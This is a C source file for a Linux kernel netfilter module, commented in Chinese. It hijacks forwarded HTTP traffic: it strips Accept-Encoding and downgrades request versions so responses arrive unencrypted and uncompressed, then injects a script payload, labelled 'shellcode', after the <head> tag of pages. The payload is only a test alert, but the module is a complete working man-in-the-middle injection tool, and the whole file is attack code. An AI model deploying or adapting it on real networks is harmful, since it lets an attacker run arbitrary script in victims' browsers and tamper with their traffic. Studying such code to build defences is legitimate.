// netfilter修改HTTP数据包（插入、修改、删除）
// 测试内核：3.13.0-32-generic
// 修改数据包长度后3.13可自动修改seq和ack，3.2以及2.68以下内核需要手动hook修改
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/if_packet.h>
#include <linux/skbuff.h>

#include <net/netfilter/nf_conntrack_helper.h>
#include <net/netfilter/nf_conntrack_seqadj.h>

#include <net/netfilter/nf_nat_helper.h>

// 用了 nf_conntrack_tcp_update 函数要用这个遵守 GPL 开放协议才能编译通过 
MODULE_LICENSE("GPL");
MODULE_AUTHOR("songboyu");
MODULE_DESCRIPTION("modify http payload, base on netfilter");
MODULE_VERSION("1.0");

// 待插入字符串
char shellcode[] = "<script>alert('----------------hijacking test--------------')</script>\n";

// 发出请求时删除请求头中Accept-Encoding字段，防止收到gzip压缩包
int delete_accept_encoding(char *pkg)
{
	char *pK = NULL;
	char *pV = NULL;
	int len = 0;

	// 只修改通过网页发出的html请求
	pK = strstr(pkg,"Accept: text/html");
	if(pK == NULL)	return 0;

	pK = strstr(pkg,"Accept-Encoding:");
	if(pK == NULL)	return 0;

	pV = strstr(pK,"\r\n");
	if(pV == NULL)	return 0;

	len = (long long)pV - (long long)pK;
	
	memset(pK,' ',len + 2);
	printk(KERN_ALERT "hook_ipv4: ---Delete Accept-Encoding---\n");
	
	return 1;
}

// 钩子函数，发送时修改请求头，接受时修改pkg
unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *))
{
	// IP数据包frag合并
	if (0 != skb_linearize(skb)) {
		return NF_ACCEPT;
	}
	struct iphdr *iph = ip_hdr(skb);

	if (iph->protocol == IPPROTO_TCP)
	{	
		struct tcphdr *tcph = (void *)iph + iph->ihl * 4;

		// unsigned int saddr = (unsigned int)iph->saddr;
		// unsigned int daddr = (unsigned int)iph->daddr;

		unsigned int sport = (unsigned int)ntohs(tcph->source);
		unsigned int dport = (unsigned int)ntohs(tcph->dest);

		char *pkg = (char *)((long long)tcph + ((tcph->doff) * 4));

		// printk(KERN_ALERT "hook_ipv4: %pI4:%d --> %pI4:%d \n", &saddr, sport, &daddr, dport);

		if (sport == 80)
		{
			if (memcmp(pkg,"HTTP/1.0 200", 12) != 0 && memcmp(pkg,"HTTP/1.1 200", 12) != 0)
			{
				return NF_ACCEPT;
			}
			// 找到页面源码中插入位置（示例中为head后面）
			char *phead = strstr(pkg,"<head>");
			if(phead == NULL){
				return NF_ACCEPT;
			}

			// 尝试不使用nf_nat_mangle_tcp_packet，手动扩容
			// -------------------------------------------------
			// skb扩容，在尾部增加strlen(shellcode)长度
			// 参考：http://book.51cto.com/art/201206/345049.htm
			// pskb_expand_head(skb, 0, strlen(shellcode), GFP_ATOMIC);

			// tail指针向后移动，增加data长度 
			// 参考：http://bbs.chinaunix.net/thread-1941060-1-1.html
			// char *tail = skb_put(skb, strlen(shellcode));

			// 数据向后移动，在首部增加shellcode
			// while(tail > phead)
			// {
			// 	tail--;
			// 	*(tail + strlen(shellcode)) = *tail;
			// }
			// memcpy(phead, shellcode, strlen(shellcode));

			// fix IP hdr checksum information
 			// iph->tot_len = htons(skb->len);
			// ip_send_check(iph);
			// 使用这种方式还需要重新计算校验和（在下面代码中）
			// -------------------------------------------------

			enum ip_conntrack_info ctinfo;
			struct nf_conn *ct = nf_ct_get(skb, &ctinfo);

			// 3.1内核，手动引入nfct_seqadj，使能够自动修改seq以及ack
			nfct_seqadj_ext_add(ct);
			// 若nf_nat_mangle_tcp_packet未找到符号要先执行sudo iptables -t nat --list
			// 接口：
			// static inline int nf_nat_mangle_tcp_packet(struct sk_buff *skb,
			// 		   struct nf_conn *ct,
			// 		   enum ip_conntrack_info ctinfo,
			// 		   unsigned int protoff,
			// 		   unsigned int match_offset,
			// 		   unsigned int match_len,
			// 		   const char *rep_buffer,
			// 		   unsigned int rep_len)
			if (ct && nf_nat_mangle_tcp_packet(skb, 
						ct, 
						ctinfo,
						iph->ihl * 4, 
						(int)(phead - pkg) + 6, 
						6,
						shellcode, 
						strlen(shellcode))) 
			{
				printk(KERN_ALERT "hook_ipv4: ---pkg modify success---\n");
		  	}
		}
		else if (dport == 80)
		{
			// HTTP 1.1 --> HTTP 1.0
			char *pK = strstr(pkg,"HTTP/1.1");
			if(pK == NULL) return NF_ACCEPT;
			memcpy(pK, "HTTP/1.0", 8);

			// 只处理GET请求
			if (memcmp(pkg,"GET",strlen("GET")) != 0)
			{
				return NF_ACCEPT;
			}

			// 发出请求时删除请求头中Accept-Encoding字段，防止收到gzip压缩包
			delete_accept_encoding(pkg);

			// 重新计算校验和
			//-------------------------------------
			int datalen = skb->len - iph->ihl*4;
			skb->ip_summed = CHECKSUM_PARTIAL;
			skb->csum_start = skb_headroom(skb) + skb_network_offset(skb) + iph->ihl * 4;
			skb->csum_offset = offsetof(struct tcphdr, check);
			// ip
			iph->check = 0;
			iph->check = ip_fast_csum(iph, iph->ihl);
			// tcp
			tcph->check = 0;
			tcph->check = ~csum_tcpudp_magic(iph->saddr, iph->daddr,
							datalen, iph->protocol, 0);
			//-------------------------------------
		}
	}
	return NF_ACCEPT;
}

// 3.2以及2.68以下内核适用
// ==========================================================================
// 3.2以及2.68以下内核中，以下三个函数由于内核没有导出符号，需要手动把实现粘贴过来的
// ------------------------------------------------------------------
// 1---
/* Adjust one found SACK option including checksum correction */
// static void
// sack_adjust(struct sk_buff *skb,
// 		struct tcphdr *tcph,
// 		unsigned int sackoff,
// 		unsigned int sackend,
// 		struct nf_nat_seq *natseq);
// 2---
/* TCP SACK sequence number adjustment */
// static inline unsigned int
// nf_nat_sack_adjust(struct sk_buff *skb,
// 		   struct tcphdr *tcph,
// 		   struct nf_conn *ct,
// 		   enum ip_conntrack_info ctinfo);
// 3---
/* TCP sequence number adjustment.  Returns 1 on success, 0 on failure */
// int
// nf_nat_seq_adjust(struct sk_buff *skb,
// 		  struct nf_conn *ct,
// 		  enum ip_conntrack_info ctinfo);
// ------------------------------------------------------------------

// 修改seq以及ack的hook函数
// unsigned int fix_seq(unsigned int hooknum, struct sk_buff *skb,
//	   const struct net_device *in, const struct net_device *out, int(*okfn)(
//			   struct sk_buff *))
// {
//   enum ip_conntrack_info ctinfo;
//   struct nf_conn *ct = nf_ct_get(skb, &ctinfo);

//   if (ct && test_bit(IPS_SEQ_ADJUST_BIT, &ct->status) 
//   		&& (ctinfo != IP_CT_RELATED + IP_CT_IS_REPLY)  ) {
//   		nf_nat_seq_adjust(skb, ct, ctinfo);
//   }
//   return NF_ACCEPT;
// }
// ==========================================================================

static struct nf_hook_ops http_hooks[] = {
	{ 
		.hook 			= hook_func,
		.pf 			= NFPROTO_IPV4,
		.hooknum 		= NF_INET_FORWARD, 
		.priority 		= NF_IP_PRI_MANGLE,
		.owner			= THIS_MODULE
	},
	// 3.2以及2.68以下内核适用
	// {
	// 	.hook		   = fix_seq,
	// 	.pf			 = PF_INET,
	// 	.hooknum		= NF_INET_PRE_ROUTING,
	// 	.priority	   = NF_IP_PRI_CONNTRACK_CONFIRM,
	// 	.owner			= THIS_MODULE
	// },
	// {
	// 	.hook		   = fix_seq,
	// 	.pf			 = PF_INET,
	// 	.hooknum		= NF_INET_POST_ROUTING,
	// 	.priority	   = NF_IP_PRI_CONNTRACK_CONFIRM,
	// 	.owner			= THIS_MODULE
	// },
};

// 模块挂载
static int init_hook_module(void)
{
	nf_register_hooks(http_hooks, ARRAY_SIZE(http_hooks));
	printk(KERN_ALERT "hook_ipv4: insmod\n");

	return 0;
}

// 模块卸载
static void cleanup_hook_module(void)
{
	nf_unregister_hooks(http_hooks, ARRAY_SIZE(http_hooks));
	printk(KERN_ALERT "hook_ipv4: rmmod\n");
}

module_init(init_hook_module);
module_exit(cleanup_hook_module);
